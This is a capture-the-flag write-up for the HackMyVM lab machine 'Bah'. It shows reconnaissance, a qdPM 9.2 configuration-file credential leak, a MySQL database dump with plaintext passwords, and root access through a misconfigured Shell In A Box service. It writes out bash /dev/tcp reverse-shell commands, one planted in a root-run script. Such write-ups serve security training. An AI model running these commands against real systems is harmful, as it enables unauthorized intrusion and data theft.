# Bah

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Bah | sml | Beginner | HackMyVM |

**Summary:**
The attack began with network scanning to identify the target and open ports. Port 80 hosted a qdPM 9.2 application, which was found to be vulnerable to a password exposure exploit, revealing database credentials. Accessing the MySQL database revealed a hidden database containing a list of subdomains and user credentials. After enumerating subdomains, `party.bah.hmv` was found hosting "Shell In A Box". Using the credentials retrieved from the database, access was gained as user `rocio`. Privilege escalation was achieved by analyzing running processes and discovering a custom `shellinaboxd` service configured to execute a script at `/tmp/dev` as root. By creating a malicious script at that location and triggering it via the web interface, a root shell was obtained.

---

## Reconnaissance

The initial step involved finding the target IP address within the network.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.60 08:00:27:57:26:1B VirtualBox
```

With the target identified at `192.168.100.60`, a full Nmap scan was performed to enumerate open ports and services.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/bah]
└─$ nmap -sC -sV -p- 192.168.100.60
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 21:27 WIB
Nmap scan report for 192.168.100.60
Host is up (0.0020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.18.0
|_http-title: qdPM | Login
|_http-server-header: nginx/1.18.0
3306/tcp open  mysql   MariaDB 5.5.5-10.5.11
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.5.11-MariaDB-1
|   Thread ID: 32
|   Capabilities flags: 63486
|   Some Capabilities: FoundRows, ConnectWithDatabase, Support41Auth, ODBCClient, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, SupportsCompression, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, IgnoreSigpipes, SupportsTransactions, LongColumnFlag, InteractiveClient, Speaks41ProtocolOld, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: >.iJt,zE)=68V']#3soR
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.60 seconds
```

The scan revealed:
*   **Port 80:** Running Nginx and hosting qdPM.
*   **Port 3306:** MariaDB (MySQL).

Visiting port 80 confirmed the presence of a qdPM login page, version 9.2.

![](image.png)

## Vulnerability Discovery

A search for exploits related to qdPM 9.2 was conducted using `searchsploit`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/bah]
└─$ searchsploit qdPM 9.2
-------------------------------------------------------- ---------------------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------------------
qdPM 9.2 - Cross-site Request Forgery (CSRF)            | php/webapps/50854.txt
qdPM 9.2 - Password Exposure (Unauthenticated)          | php/webapps/50176.txt
-------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The "Password Exposure (Unauthenticated)" exploit (50176) seemed promising as it didn't require prior authentication. Examining the exploit details revealed that database credentials could be exposed in a YAML configuration file accessible via the web.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/bah]
└─$ cat 50176.txt
# Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)
# Date: 03/08/2021
# Exploit Author: Leon Trappett (thepcn3rd)
# Vendor Homepage: https://qdpm.net/
# Software Link: https://sourceforge.net/projects/qdpm/files/latest/download
# Version: 9.2
# Tested on: Ubuntu 20.04 Apache2 Server running PHP 7.4

The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://<website>/core/config/databases.yml file and download.    
```

## Exploitation and Internal Enumeration

Following the exploit instructions, the `databases.yml` file was downloaded from the target.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/bah]
└─$ curl -O http://192.168.100.60/core/config/databases.yml
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   273 100   273   0     0 28652     0  --:--:-- --:--:-- --:--:-- 30333

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/bah]
└─$ cat databases.yml

all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: 'mysql:dbname=qpm;host=localhost'
      profiler: false
      username: qpmadmin
      password: "<?php echo urlencode('q[REDACTED]') ; ?>"
      attributes:
        quote_identifier: true
```

The configuration file revealed the database credentials.

Using these credentials, a connection to the exposed MySQL service on port 3306 was established.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/bah]
└─$ mysql -h 192.168.100.60 -u qpmadmin -p[REDACTED] --skip-ssl
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 3866
Server version: 10.5.11-MariaDB-1 Debian 11

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

Enumerating the databases revealed an interesting database named `hidden`.

```bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| hidden             |
| information_schema |
| mysql              |
| performance_schema |
| qpm                |
+--------------------+
5 rows in set (0.046 sec)

MariaDB [(none)]> use hidden;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [hidden]> show tables;
+------------------+
| Tables_in_hidden |
+------------------+
| url              |
| users            |
+------------------+
2 rows in set (0.001 sec)
```

The `url` table contained a list of subdomains, and the `users` table contained usernames and passwords.

```bash
MariaDB [hidden]> select * from url;
+----+-------------------------+
| id | url                     |
+----+-------------------------+
|  1 | http://portal.bah.hmv   |
|  2 | http://imagine.bah.hmv  |
|  3 | http://ssh.bah.hmv      |
|  4 | http://dev.bah.hmv      |
|  5 | http://party.bah.hmv    |
|  6 | http://ass.bah.hmv      |
|  7 | http://here.bah.hmv     |
|  8 | http://hackme.bah.hmv   |
|  9 | http://telnet.bah.hmv   |
| 10 | http://console.bah.hmv  |
| 11 | http://tmux.bah.hmv     |
| 12 | http://dark.bah.hmv     |
| 13 | http://terminal.bah.hmv |
+----+-------------------------+
13 rows in set (0.003 sec)

MariaDB [hidden]> select * from users;
+----+---------+---------------------+
| id | user    | password            |
+----+---------+---------------------+
|  1 | jwick   | Ihaveafuckingpencil |
|  2 | rocio   | I[REDACTED]         |
|  3 | luna    | Ihavealover         |
|  4 | ellie   | Ihaveapassword      |
|  5 | camila  | Ihaveacar           |
|  6 | mia     | IhaveNOTHING        |
|  7 | noa     | Ihaveflow           |
|  8 | nova    | Ihavevodka          |
|  9 | violeta | Ihaveroot           |
+----+---------+---------------------+
9 rows in set (0.006 sec)
```

The discovered domains were added to `/etc/hosts`.

```bash
┌──(root㉿CLIENT-DESKTOP)-[/tmp/bah]
└─# echo "192.168.100.60 portal.bah.hmv imagine.bah.hmv ssh.bah.hmv dev.bah.hmv party.bah.hmv ass.bah.hmv here.bah.hmv hackme.bah.hmv telnet.bah.hmv console.bah.hmv tmux.bah.hmv dark.bah.hmv terminal.bah.hmv" | tee -a /etc/hosts
```

To determine which subdomains were active, `ffuf` was used to fuzz the list.
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/bah]
└─$ echo -e "portal\nimagine\nssh\ndev\nparty\nass\nhere\nhackme\ntelnet\nconsole\ntmux\ndark\nterminal" > subdomains.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/bah]
└─$ ffuf -w subdomains.txt -u http://192.168.100.60 -H "Host: FUZZ.bah.hmv" -v
...
[Status: 200, Size: 5216, Words: 1247, Lines: 124, Duration: 311ms]
| URL | http://192.168.100.60
    * FUZZ: party
...
```

The subdomain `party.bah.hmv` returned a different response size compared to the others. Accessing it via the browser revealed a "Shell In A Box" login interface.

![](image-1.png)

## Initial Access

Using the credentials found in the `users` table earlier, we attempted to log in. The user `rocio` provided successful access.

```bash
bah login: rocio                                                                                                                            
Password:                                                                                                                                   
Linux bah 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-03) x86_64                                                                        
...                                                     
rocio@bah:~$ id                                                                                                                             
uid=1000(rocio) gid=1000(rocio) groups=1000(rocio),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

To get a more stable shell, a reverse shell was triggered back to the attacker machine.

**Attacker:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/bah]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

**Target (Shell In A Box):**
```bash
rocio@bah:~$ /bin/bash -i >& /dev/tcp/192.168.100.1/4444 0>&1
```

Once connected, the TTY was upgraded for better interactivity.

```bash
rocio@bah:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
rocio@bah:~$ ^Z
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/bah]
└─$ stty raw -echo; fg
```

## Privilege Escalation

Enumeration of running processes was performed to identify potential escalation vectors. A loop was used to inspect process command lines.

```bash
rocio@bah:~$ for pid in $(ps -e -o pid=); do cmd=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' '); [ ! -z "$cmd" ] && echo "PID: $pid | CMD: $cmd"; done
...
PID: 462 | CMD: /usr/bin/shellinaboxd -q ... -s/:LOGIN -s /devel:root:root:/:/tmp/dev
PID: 464 | CMD: /usr/bin/shellinaboxd -q ... -s/:LOGIN -s /devel:root:root:/:/tmp/dev
...
```

The process list revealed that `shellinaboxd` was running with a custom configuration: `-s /devel:root:root:/:/tmp/dev`. This configuration indicates that accessing the `/devel` endpoint via Shell In A Box executes the executable at `/tmp/dev` with `root` privileges (user:group `root:root`).

To exploit this, a malicious script was created at `/tmp/dev` to trigger a reverse shell.

```bash
rocio@bah:~$ cat > /tmp/dev << 'EOF'
> #!/bin/bash
> bash -i >& /dev/tcp/192.168.100.1/8888 0>&1
> EOF
rocio@bah:~$ chmod +x /tmp/dev
```

A listener was set up on port 8888.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/bah]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
```

The exploit was triggered by navigating to `http://party.bah.hmv/devel/` in the browser.

The listener received the connection as `root`.

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 59303
root@bah:/# id ; whoami ; hostname
id ; whoami ; hostname
uid=0(root) gid=0(root) groups=0(root)
root
bah
root@bah:/# cat /home/rocio/user.txt /root/root.txt
Hd[REDACTED]
HM[REDACTED]
```

---

## Attack Chain Summary
1.  **Reconnaissance**: Discovered open ports 80 (qdPM 9.2) and 3306 (MySQL) via Nmap.
2.  **Vulnerability Discovery**: Identified a known "Password Exposure" vulnerability in qdPM 9.2 (Exploit-DB 50176).
3.  **Exploitation**: Downloaded `databases.yml` to retrieve cleartext database credentials.
4.  **Internal Enumeration**: Connected to MariaDB, dumped the `hidden` database, retrieved a list of subdomains and user credentials.
5.  **Lateral Movement**: Discovered `party.bah.hmv` running Shell In A Box. Logged in as user `rocio` using credentials found in the database.
6.  **Privilege Escalation**: Identified a custom `shellinaboxd` service configured to run `/tmp/dev` as root. Created a malicious reverse shell script at `/tmp/dev` and triggered it via the web interface to gain root access.
